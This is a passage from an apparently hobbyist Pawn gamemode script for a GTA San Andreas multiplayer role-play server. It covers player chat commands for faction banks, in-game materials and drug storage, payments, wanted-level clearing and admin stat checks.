                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                PlayerInfo[para1][pFwarn] = PlayerInfo[para1][pFwarn] -= 1;
                                SaveKonVal(para1, "pFwarn", PINFO[para1][pFwarn]);
                                format(string, sizeof(string), "You have been UnFactionWarned by Leader %s", sendername);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                format(string, sizeof(string), "You have UnFactionWarned %s, now you have %d factionwarn.", giveplayer,PlayerInfo[playerid][pFwarn]);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                                new year, month,day;
                                getdate(year, month, day);
                                format(string, sizeof(string), "%s have been unwarned %s in faction id %d (%d-%d-%d)",sendername,giveplayer,famil,month,day,year);
                                FactionLog(string);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GRAD2, "This player isn't in your faction.");
                            }
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "You cannot unfwarn the leader.");
                        }
                    }
                }
                else
                {
                SCM(playerid,COLOR_WHITE,"Player not connected.");
                return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
                return 1;
            }
        }
        return 1;
    }
//---------------------------------[F-DEPOSIT-SITEM]-------------------------------------
    if(strcmp(cmd, "/fdeposit", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAMember(playerid))
            {
                tmp = strtok(cmdtext, idx);
                new x;
                if(PlayerInfo[playerid][pLeader]) x = PlayerInfo[playerid][pLeader]-1;
                else x = PlayerInfo[playerid][pMember]-1;
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /fdeposit <Amount>");
                    return 1;
                }
                new cashdeposit = strval(tmp);
                GetPlayerName(playerid, sendername, sizeof(sendername));
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /fdeposit <Amount>");
                    return 1;
                }
                if(IsPlayerInHQ(playerid))
                {
                    if(GetPlayerPool(playerid) >= cashdeposit && cashdeposit >= 1)
                    {
                        GivePlayerPool(playerid,-cashdeposit);
                        new oldbalance = DynamicFactions[x][fBank];
                        DynamicFactions[x][fBank]=DynamicFactions[x][fBank]+cashdeposit;
                        SendClientMessage(playerid, CRISTIAN, "|____SAFEBOX STATMENT____|");
                        format(string, sizeof(string), " Old Balance: $%s", FormatNumber(oldbalance));
                        SendClientMessage(playerid, 0xA4A4A4FF, string);
                        format(string, sizeof(string), " Deposit: +$%s ", FormatNumber(cashdeposit));
                        SendClientMessage(playerid, 0xD8D8D8FF, string);
                        SendClientMessage(playerid, CRISTIAN, "|---------------------------------------------| ");
                        format(string, sizeof(string), " New balance: $%s", FormatNumber(DynamicFactions[x][fBank]));
                        SendClientMessage(playerid, 0xFFFFFFFF, string);
                        SaveDynamicFactions(x);
                        return 1;
                    }
                    else

                    {
                        SendClientMessage(playerid, COLOR_WHITE, "You haven't that amount of money!");
                    }
                }
                else
                {
                    SCM(playerid,COLOR_ALI,"You are not in your HQ.");
                }
            }
            else
            {
            SCM(playerid,COLOR_ALI,"You are not a Family Member.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/fwithdraw", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if((PINFO[playerid][pLeader] == 5 || PINFO[playerid][pLeader] == 6 || PINFO[playerid][pLeader] == 12 || PINFO[playerid][pLeader] == 13 || PINFO[playerid][pLeader] == 14 || PINFO[playerid][pLeader] == 15) || PINFO[playerid][pRank] >= 6)
            {

                tmp = strtok(cmdtext, idx);
                new x;
                x = PlayerInfo[playerid][pLeader]-1;
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /fwithdraw <Amount>");
                    return 1;
                }
                new cashdeposit = strval(tmp);
                GetPlayerName(playerid, sendername, sizeof(sendername));
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /fwithdraw <Amount>");
                    return 1;
                }
                if(IsPlayerInHQ(playerid))
                {
                    if(cashdeposit <= DynamicFactions[x][fBank])
                    {
                        if(cashdeposit < 0) return SCM(playerid, COLOR_GRAD2, "Bug Ghadime Rafigh");
                        new oldbalance1 = DynamicFactions[x][fBank];
                        GivePlayerPool(playerid,cashdeposit);
                        DynamicFactions[x][fBank]=DynamicFactions[x][fBank]-cashdeposit;
                        SCM(playerid, CRISTIAN, "|____SAFEBOX STATMENT____|");
                        format(string, sizeof(string), "Old Balance: $%s ", FormatNumber(oldbalance1));
                        SCM(playerid, COLOR_GRAD4, string);
                        format(string, sizeof(string), "Withdraw: -$%s ", FormatNumber(cashdeposit));
                        SCM(playerid, COLOR_GRAD4, string);
                        SCM(playerid, CRISTIAN, "|---------------------------------------------| ");
                        format(string, sizeof(string), "New balance: %s %", FormatNumber(DynamicFactions[x][fBank]));
                        SCM(playerid, COLOR_GRAD2, string);
                        SaveDynamicFactions(x);
                        return 1;
                    }
                    else
                    SCM(playerid, COLOR_GRAD4, "You haven't that amount of money in your faction seif");
                    return 1;
                }
                else
                SCM(playerid,COLOR_ALI,"You are not in your HQ.");
                return 1;
            }
            else
            SCM(playerid,COLOR_ALI,"You are not a Family Leader.");
            return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/fbalance", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAMember(playerid))
            {
                new x;
                if(PlayerInfo[playerid][pLeader]) x = PlayerInfo[playerid][pLeader]-1;
                else x = PlayerInfo[playerid][pMember]-1;
                format(string, sizeof(string), "Your family have $%s in safebox.", FormatNumber(DynamicFactions[x][fBank]));
                SendClientMessage(playerid, 0xEEE84BFF, string);
            }
        }
        return 1;
    }
if(strcmp(cmd, "/fmats", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAMemberC(playerid))
            {
                new x;
                if(PlayerInfo[playerid][pLeader]) x = PlayerInfo[playerid][pLeader]-1;
                else x = PlayerInfo[playerid][pMember]-1;
                if(PlayerInfo[playerid][pRank] < 3)
                {
                    SendClientMessage(playerid, COLOR_GREY, "You need to be Rank 3 or Higher for this action.");
                    return 1;
                }
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr))
                {
                    if(IsPlayerInHQ(playerid))
                    {
                        format(string, sizeof(string), "Faction Mats: %d.", DynamicFactions[x][fMats]);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                    }
                    SendClientMessage(playerid, CRISTIAN, "___________________________________________");
                    SendClientMessage(playerid, COL_SYN, "Syntax: /fmats <Name> <Amount>");
                    SendClientMessage(playerid, COL_SYN, "Available Names: Take, Put");
                    return 1;
                }
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(giveplayerid, playername, sizeof(playername));
                if(strcmp(x_nr,"take",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /fmats take <Amount>");
                        return 1;
                    }
                    new materialsdeposit = strval(tmp);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /fmats take <Amount>");
                        return 1;
                    }
                    if(IsPlayerInHQ(playerid))
                    {
                      if(DynamicFactions[x][fMats]  >= materialsdeposit && materialsdeposit >= 1 )
                        {
                            PlayerInfo[playerid][pMats] += materialsdeposit;
                            SaveKonVal(playerid, "pMats", PINFO[playerid][pMats]);
                            DynamicFactions[x][fMats]=DynamicFactions[x][fMats]-materialsdeposit;
                            SendClientMessage(playerid, CRISTIAN, "|______Faction Mats______|");
                            format(string, sizeof(string), "You get %d mats.", materialsdeposit);
                            SendClientMessage(playerid, COLOR_GRAD2, string);
                            SendClientMessage(playerid, CRISTIAN, "|------------------------------------| ");
                            format(string, sizeof(string), "Total Mats: %d .", DynamicFactions[x][fMats]);
                            SendClientMessage(playerid, COLOR_GRAD4, string);
                            format(string, sizeof(string),  "%s has just taken %d mats from the HQ !",sendername,materialsdeposit);
                            SendFamilyMessage(x, COLOR_GRAD4, string);
                            SaveDynamicFactions(x);
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "There isn't that much mats in storage!");
                        }
                    }
                    else
                    {
                        SCM(playerid,COLOR_ALI,"You are not in your HQ.");
                    }
                }
                else if(strcmp(x_nr,"put",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /fmats put <Amount>");
                        return 1;
                    }
                    new materialsdeposit = strval(tmp);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /fmats put <Amount>");
                        return 1;
                    }
                    if(IsPlayerInHQ(playerid))
                    {
                         if(PlayerInfo[playerid][pMats] >= materialsdeposit && materialsdeposit >= 1 )
                        {
                            PlayerInfo[playerid][pMats] =PlayerInfo[playerid][pMats]-materialsdeposit;
                            SaveKonVal(playerid, "pMats", PINFO[playerid][pMats]);
                            DynamicFactions[x][fMats] +=materialsdeposit;
                            SendClientMessage(playerid, CRISTIAN, "|______Faction Mats______|");
                            format(string, sizeof(string), "Deposit %d mats.", materialsdeposit);
                            SendClientMessage(playerid, COLOR_GRAD2, string);
                            SendClientMessage(playerid, CRISTIAN, "|------------------------------------| ");
                            format(string, sizeof(string), "Total Mats: %d .", DynamicFactions[x][fMats]);
                            SendClientMessage(playerid, COLOR_GRAD4, string);
                            SaveDynamicFactions(x);
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "You haven't that much mats on you!");
                        }
                    }
                    else
                    {
                        SCM(playerid,COLOR_ALI,"You are not in your HQ.");
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "Unknown fMats name.");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "You are not a faction member.");
                return 1;
            }
        }
        return 1;
    }
if(strcmp(cmd, "/fdrugs", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAMemberC(playerid))
            {
                new x;
                if(PlayerInfo[playerid][pLeader]) x = PlayerInfo[playerid][pLeader]-1;
                else x = PlayerInfo[playerid][pMember]-1;
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr))
                {
                    if(PlayerToPoint(30.0,playerid,DynamicFactions[x][ffX],DynamicFactions[x][ffY],DynamicFactions[x][ffZ]))
                    {
                        format(string, sizeof(string), "Faction Drugs: %d.", DynamicFactions[x][fDrugs]);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                    }
                    SendClientMessage(playerid, COL_SYN, "Syntax: /fdrugs <Name> <Amount>");
                    SendClientMessage(playerid, COL_SYN, "Available Names: Take , Put");
                    return 1;
                }
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(giveplayerid, playername, sizeof(playername));
                if(strcmp(x_nr,"take",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /fdrugs take <Amount>");
                        return 1;
                    }
                    new materialsdeposit = strval(tmp);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /fdrugs take <Amount>");
                        return 1;
                    }
                    if(IsPlayerInHQ(playerid))
                    {
                         if(DynamicFactions[x][fDrugs]  >= materialsdeposit && materialsdeposit >= 1 )
                        {
                            PlayerInfo[playerid][pDrugs] += materialsdeposit;
                            DynamicFactions[x][fDrugs]=DynamicFactions[x][fDrugs]-materialsdeposit;
                            SendClientMessage(playerid, CRISTIAN, "|______Faction Drug______|");
                            format(string, sizeof(string), "You get %d grams of drugs.", materialsdeposit);
                            SendClientMessage(playerid, COLOR_GRAD2, string);
                            SendClientMessage(playerid, CRISTIAN, "|------------------------------------| ");
                            format(string, sizeof(string), "Total Drugs: %d grams.", DynamicFactions[x][fDrugs]);
                            SendClientMessage(playerid, COLOR_GRAD4, string);
                            format(string, sizeof(string),  "%s has just taken %d drugs from the HQ !",sendername,materialsdeposit);
                            SendFamilyMessage(x, COLOR_GRAD4, string);
                            SaveDynamicFactions(x);
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "There isn't that much drugs in storage!");
                        }
                    }
                    else
                    {
                        SCM(playerid,COLOR_ALI,"You are not in your HQ.");
                    }
                }
                else if(strcmp(x_nr,"put",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /fdrugs put <Amount>");
                        return 1;
                    }
                    new materialsdeposit = strval(tmp);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /fdrugs put <Amount>");
                        return 1;
                    }
                    if(IsPlayerInHQ(playerid))
                    {
                       if(PlayerInfo[playerid][pDrugs]  >= materialsdeposit && materialsdeposit >= 1 )
                        {
                            PlayerInfo[playerid][pDrugs] =PlayerInfo[playerid][pDrugs]-materialsdeposit;
                            SaveKonVal(playerid, "pDrugs", PINFO[playerid][pDrugs]);
                            DynamicFactions[x][fDrugs] +=materialsdeposit;
                            SendClientMessage(playerid, CRISTIAN, "|______Faction Drug______|");
                            format(string, sizeof(string), "Deposit %d grams of drugs.", materialsdeposit);
                            SendClientMessage(playerid, COLOR_GRAD2, string);
                            SendClientMessage(playerid, CRISTIAN, "|------------------------------------| ");
                            format(string, sizeof(string), "Total Drugs: %d grams.", DynamicFactions[x][fDrugs]);
                            SendClientMessage(playerid, COLOR_GRAD4, string);
                            SaveDynamicFactions(x);
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "You haven't that much drugs on you!");
                        }
                    }
                    else
                    {
                        SCM(playerid,COLOR_ALI,"You are not in your HQ.");
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "Unknown fDrugs name.");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "You are not a faction member.");
                return 1;
            }
        }
        return 1;
    }




//---------------------------------[Admin check fbank]-------------------------------------// Hey Man Ta Inja omadam //
    if(strcmp(cmd, "/afcheck", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 5)
            {
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr))
                {
                    SendClientMessage(playerid, CRISTIAN, "___________________________________________");
                    SendClientMessage(playerid, COL_SYN, "Syntax: /afcheck <Name>");
                    SendClientMessage(playerid, COL_SYN, "Available Names: DT, HIT, SM, SMF");
                    SendClientMessage(playerid, COL_SYN, "Available Names: LM, TG, TK, TB");
                    return 1;
                }
                if(strcmp(x_nr,"SMF",true) == 0)
                {
                    new idfactiune;
                    idfactiune = 5;
                    SendClientMessage(playerid, COLOR_GRAD4, "Silence Mafia Deposit");
                    SendClientMessage(playerid, CRISTIAN, "|-------------------------|");
                    format(string, sizeof(string), "Balance: $%s.",FormatNumber(DynamicFactions[idfactiune][fBank]));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    format(string, sizeof(string), "Drugs: %d g.",DynamicFactions[idfactiune][fDrugs]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    format(string, sizeof(string), "Materials: %d .",DynamicFactions[idfactiune][fMats]);
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                }
                else if(strcmp(x_nr,"TK",true) == 0)
                {
                    new idfactiune;
                    idfactiune = 6;
                    SendClientMessage(playerid, COLOR_GRAD4, "The Killers Deposit");
                    SendClientMessage(playerid, CRISTIAN, "|-------------------------|");
                    format(string, sizeof(string), "Balance: $%s.",FormatNumber(DynamicFactions[idfactiune][fBank]));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    format(string, sizeof(string), "Drugs: %d g.",DynamicFactions[idfactiune][fDrugs]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    format(string, sizeof(string), "Materials: %d .",DynamicFactions[idfactiune][fMats]);
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                }
                else if(strcmp(x_nr,"HIT",true) == 0)
                {
                    new idfactiune;
                    idfactiune = 8;
                    SendClientMessage(playerid, COLOR_GRAD4, "Hitman Deposit");
                    SendClientMessage(playerid, CRISTIAN, "|-------------------------|");
                    format(string, sizeof(string), "Balance: $%s.",FormatNumber(DynamicFactions[idfactiune][fBank]));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                }
                else if(strcmp(x_nr,"LM",true) == 0)
                {
                    new idfactiune;
                    idfactiune = 13;
                    SendClientMessage(playerid, COLOR_GRAD4, " Legendary Men Deposit");
                    SendClientMessage(playerid, CRISTIAN, "|-------------------------|");
                    format(string, sizeof(string), "Balance: $%s.",FormatNumber(DynamicFactions[idfactiune][fBank]));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    format(string, sizeof(string), "Drugs: %d g.",DynamicFactions[idfactiune][fDrugs]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    format(string, sizeof(string), "Materials: %d .",DynamicFactions[idfactiune][fMats]);
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                }
                else if(strcmp(x_nr,"DT",true) == 0)
                {
                    new idfactiune;
                    idfactiune = 12;
                    SendClientMessage(playerid, COLOR_GRAD4, "Dangerous Tigers Deposit");
                    SendClientMessage(playerid, CRISTIAN, "|-------------------------|");
                    format(string, sizeof(string), "Balance: $%s.",FormatNumber(DynamicFactions[idfactiune][fBank]));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    format(string, sizeof(string), "Drugs: %d g.",DynamicFactions[idfactiune][fDrugs]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    format(string, sizeof(string), "Materials: %d .",DynamicFactions[idfactiune][fMats]);
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                }
                else if(strcmp(x_nr,"TG",true) == 0)
                {
                    new idfactiune;
                    idfactiune = 14;
                    SendClientMessage(playerid, COLOR_GRAD4, "Fast N Furious Deposit");
                    SendClientMessage(playerid, CRISTIAN, "|-------------------------|");
                    format(string, sizeof(string), "Balance: $%s.",FormatNumber(DynamicFactions[idfactiune][fBank]));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    format(string, sizeof(string), "Drugs: %d g.",DynamicFactions[idfactiune][fDrugs]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    format(string, sizeof(string), "Materials: %d .",DynamicFactions[idfactiune][fMats]);
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                }
                if(strcmp(x_nr,"SM",true) == 0)
                {
                    new idfactiune;
                    idfactiune = 15;
                    SendClientMessage(playerid, COLOR_GRAD4, "Storm Men Deposit");
                    SendClientMessage(playerid, CRISTIAN, "|-------------------------|");
                    format(string, sizeof(string), "Balance: $%s.",FormatNumber(DynamicFactions[idfactiune][fBank]));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    format(string, sizeof(string), "Drugs: %d g.",DynamicFactions[idfactiune][fDrugs]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    format(string, sizeof(string), "Materials: %d .",DynamicFactions[idfactiune][fMats]);
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                }
                if(strcmp(x_nr,"TB",true) == 0)
                {
                    new idfactiune;
                    idfactiune = 19;
                    SendClientMessage(playerid, COLOR_GRAD4, "The Racers Deposit");
                    SendClientMessage(playerid, CRISTIAN, "|-------------------------|");
                    format(string, sizeof(string), "Balance: $%s.",FormatNumber(DynamicFactions[idfactiune][fBank]));
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    format(string, sizeof(string), "Drugs: %d g.",DynamicFactions[idfactiune][fDrugs]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    format(string, sizeof(string), "Materials: %d .",DynamicFactions[idfactiune][fMats]);
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GRAD4, "Unknown family name");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }

//-------------------------------[Pay]--------------------------------------------------------------------------
   if(strcmp(cmd, "/pay", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /pay <PlayerID/PartOfName> <Amount>");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /pay <PlayerID/PartOfName> <Amount>");
                return 1;
            }
            moneys = strval(tmp);
            if(PlayerInfo[playerid][pLevel] <= 2)
            {
            SCM(playerid,COLOR_Good,"You must be at Level +3 to pay over 2000$.");
            return 1;
            }
            if(moneys > 2001 && PlayerInfo[playerid][pLevel] < 3)
            {
                SCM(playerid,COLOR_Good,"You must be at Level +3 to pay over 1000$.");
                return 1;
            }
            if(moneys > 3001 && PlayerInfo[playerid][pLevel] < 4)
            {
                SCM(playerid,COLOR_Good,"You must be at Level +4 to pay over 400$.");
                return 1;
            }
            if(moneys > 4001 && PlayerInfo[playerid][pLevel] < 5)
            {
                SCM(playerid,COLOR_Good,"You must be at Level +5 to pay over 4000$.");
                return 1;
            }
            if(moneys > 5001 && PlayerInfo[playerid][pLevel] < 7)
            {
                SCM(playerid,COLOR_Good,"You must be at Level +7 to pay over 5,000$.");
                return 1;
            }
            if(moneys < 1 || moneys > 5001)
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Dont go below 1$, or above 5,000$ at once.");
                return 1;
            }
            if (IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(5.0, playerid, giveplayerid))
                    {
                        if(giveplayerid == playerid)
                        {
                            SendClientMessage(playerid, COLOR_GREY, "You can not pay for yourself.");
                            return 1;
                        }
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        playermoney = GetPlayerPool(playerid);
                        if (moneys > 0 && playermoney >= moneys)
                        {
                            GivePlayerPool(playerid, (0 - moneys));
                            GivePlayerPool(giveplayerid, moneys);
                            format(string, sizeof(string), "You have sent %s(player: %d), $%s.", giveplayer,giveplayerid,FormatNumber( moneys));
                            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                            SendClientMessage(playerid, COLOR_GRAD1, string);
                            format(string, sizeof(string), "You have recieved $%s from %s(player: %d).", FormatNumber(moneys), sendername, playerid);
                            SendClientMessage(giveplayerid, COLOR_GRAD1, string);
                            format(string, sizeof(string), "%s has paid $%s to %s", sendername, FormatNumber(moneys), giveplayer);
                            if(moneys >= 1000000)
                            {
                                ABroadCast(COLOR_YELLOW,string,1);
                            }
                            PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
                            format(string, sizeof(string), "%s takes out some cash, and hands it to %s.", sendername ,giveplayer);
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GRAD1, "Invalid transaction amount.");
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GRAD1, "your too far away.");
                    }
                }//invalid id
            }
            else
            {
                format(string, sizeof(string), "That player is offline.");
                SendClientMessage(playerid, COLOR_GRAD1, string);
            }
        }
        return 1;
    }


		if(strcmp(cmd, "/clear", true) == 0)
		{
		if(!IsACop(playerid)) return SCM(playerid,COLOR_BLUE,"You are not a Cop.");
		tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendMessage(playerid, COL_SYN, "Syntax: /clear <PlayerID/PartOfName>");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				if(PlayerInfo[giveplayerid][pWanted] == 0)
				{
				SCM(playerid,COLOR_AMIR,"That player doesn't has any wanted level.");
				return 1;
				}
				new wanted = GetPlayerWantedLevel(giveplayerid) - 1;
				SetPlayerWantedLevel(giveplayerid, wanted);
				new adminame[MAX_PLAYER_NAME];
				new giveplayers[MAX_PLAYER_NAME];
				GetPlayerName(giveplayerid,giveplayers,sizeof(giveplayers));
				GetPlayerName(playerid,adminame,sizeof(adminame));
				new strr[128];
				format(strr,sizeof(strr),"Cop %s Cleared 1 wanted from you.",adminame);
				SCM(giveplayerid,COLOR_AMIR,strr);
				for(new i = 0; i < LastPID; i++)
					{
						if(IsPlayerConnected(i))
						{
							if(IsACop(i))
							{
								new cbjstore[512];
								format(cbjstore, sizeof(cbjstore), "Cop %s cleared 1 wanted from %s",adminame,giveplayers);
								SendMessage(i, TEAM_BLUE_COLOR, cbjstore);
							}
						}
					}
				return 1;
				}
				else {
				SCM(playerid,COLOR_WHITE,"Player not connected.");
				return 1;
				}
				}



    if(strcmp(cmd, "/clearwanted", true) == 0)
    {
    if(PlayerInfo[playerid][pAdmin] <= 4)
    {
    SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
    return 1;
    }
    tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /clearwanted <PlayerID/PartOfName>");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
            if(PlayerInfo[giveplayerid][pWanted] == 0)
            {
            SCM(playerid,COLOR_ALI,"That player doesn't has any wanted level.");
            return 1;
            }
            SetPlayerWantedLevel(giveplayerid, 0);
            new adminame[MAX_PLAYER_NAME];
            new giveplayers[MAX_PLAYER_NAME];
            GetPlayerName(giveplayerid,giveplayers,sizeof(giveplayers));
            GetPlayerName(playerid,adminame,sizeof(adminame));
            new strr[128];
            format(strr,sizeof(strr),"Admin %s Cleared your wanted level(s).",adminame);
            SCM(giveplayerid,COLOR_ALI,strr);
            format(strr,sizeof(strr),"You cleard %s wanted level(s).",giveplayers);
            SCM(playerid,COLOR_ALI,strr);
            return 1;
            }
            else {
            SCM(playerid,COLOR_WHITE,"Player not connected.");
            return 1;
            }
            }
   /* if(strcmp(cmd, "/exam", true) == 0)
    {
		if(!PlayerToPoint(2.0,playerid,1641.388671,-2177.379638,13.554687)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "Shoma Dar DMV Nistid.");
		if(PINFO[playerid][pCarLicS] > 0) return SCM(playerid,COLOR_ROUZ,"Govahiname Ranandegi Shoma Toghif Shode Ast.");
		if(GetPlayerPool(playerid) < 50) return SendClientMessage(playerid,COLOR_LIGHTBLUE,"You haven't $50.");
//		if(PlayerInfo[playerid][pCarLic] != 0) return SendClientMessage(playerid,COLOR_LIGHTBLUE,"Shoma Govahiname Ranandegi Darid.");
		if(TakingLesson[playerid] != 0) return SendClientMessage(playerid,COLOR_LIGHTBLUE,"Shoma Dar Hale Amoozesh Hastid.");
		TakingLesson[playerid] = 1;
		PutPlayerInExamVehicle(playerid);
		GivePlayerPool(playerid,-50);
    }*/
    if(strcmp(cmd, "/charity", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /charity <Amount>");
                return 1;
            }
            moneys = strval(tmp);
            if(moneys < 500)
            {
                SendClientMessage(playerid, COLOR_GRAD1, "Amount must be higher than $500.");
                return 1;
            }
            if(GetPlayerPool(playerid) < moneys)
            {
                SendClientMessage(playerid, COLOR_GRAD1, "You haven't that much money.");
                return 1;
            }
            GivePlayerPool(playerid, -moneys);
            GetPlayerName(playerid, sendername, sizeof(sendername));
            format(string, sizeof(string), "%s Thank you for your donation of, $%s.",sendername, FormatNumber(moneys));
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            SendClientMessage(playerid, COLOR_GRAD1, string);
            format(string,256,"Player %s has been charity $%s",PINFO[playerid][pName],FormatNumber(moneys));
            for(new i;i<LastPID;i++)
            {
                if(PINFO[i][pLeader] == 7)
                {
                    SCM(i,COLOR_LIGHTRED,string);
                }
            }
            TaxValue += moneys;
            SaveStuff();
        }
        return 1;
    }
//-------------------------------[Stats]----------------------------------------------------
    if (strcmp(cmd, "/stats", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (gPlayerLogged[playerid] != 0)
            {
                ShowStats(playerid,playerid);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD1, "You are not Logged in!");
            }
        }
        return 1;
    }
//-------------------------------[Check]----------------------------------------------------
    if (strcmp(cmd, "/check", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /check [playerid/PartOfName]");
                    return 1;
                }
                //giveplayerid = strval(tmp);
                giveplayerid = ReturnUser(tmp);
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        ShowStats(playerid,giveplayerid);
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GRAD1, "No Such Player");
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Error: You Are Not Admin Or Helper");
            }
        }
        return 1;
    }
    if(strcmp(cmd,"/heal",true) == 0)
    {
    if(TooHouse[playerid] != 9999)
    {
    if(HouseInfo[TooHouse[playerid]][hHel] == 1)
    {
    SetPlayerKhoon(true, playerid,100);
    PlayerPlaySound(playerid,1083,0,0,0);
    }
    }
    if(IsPlayerInHQ(playerid))
    {
    SetPlayerKhoon(true, playerid,100);
